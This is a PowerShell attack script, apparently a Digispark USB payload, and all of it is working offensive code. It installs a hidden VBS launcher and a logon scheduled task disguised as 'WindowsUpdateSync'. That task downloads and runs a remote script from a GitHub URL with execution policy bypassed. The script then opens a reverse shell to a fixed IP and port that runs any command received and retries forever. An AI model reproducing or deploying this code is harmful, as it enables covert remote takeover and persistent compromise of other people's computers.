# --- 1. IMMEDIATE PERSISTENCE (The Priority) ---
# We install the Scheduled Task and the VBS launcher BEFORE we try to connect.
# This ensures that even if the connection fails now, it will work in 60 seconds.

$TaskName = "WindowsUpdateSync"
$VBSPath = "$env:APPDATA\win_sys_helper.vbs"
$Url = "https://raw.githubusercontent.com/thegostman/happy/refs/heads/main/happy.ps1"
$LHOST = "192.168.43.109"
$LPORT = 4444

# Create the Silent VBS Launcher
$VBSCode = @"
Set WshShell = CreateObject("WScript.Shell")
' The 0 hides the window, the False means don't wait for it to finish
WshShell.Run "powershell.exe -NoP -W Hidden -Exec Bypass -Command IEX(New-Object Net.WebClient).DownloadString('$Url')", 0, False
"@
Set-Content -Path $VBSPath -Value $VBSCode -Force

# Register the Scheduled Task (Runs every time anyone logs in)
if (!(Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
    $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VBSPath`""
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force
}

# --- 2. THE RE-ENTRY (Self-Backgrounding) ---
# If this script was just run by the Digispark, we want it to spawn a 
# permanent background process and let the Digispark process exit.

# --- 3. THE BEACON LOOP (The Infinite Search) ---
# This loop is now wrapped in a Try/Catch that never gives up.
while($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true
        $writer.WriteLine("--- GHOST SYSTEM ONLINE ---")
        $reader = New-Object System.IO.StreamReader($stream)
        
        while($client.Connected) {
            $writer.Write("PS " + (Get-Location).Path + "> ")
            $line = $reader.ReadLine()
            if ($null -eq $line -or $line -eq "exit") { break }
            $out = (Invoke-Expression $line 2>&1 | Out-String)
            $writer.WriteLine($out)
        }
        $client.Close()
    }
    catch {
        # If no listener is found, wait 10 seconds and try again forever.
        Start-Sleep -Seconds 10
    }
}
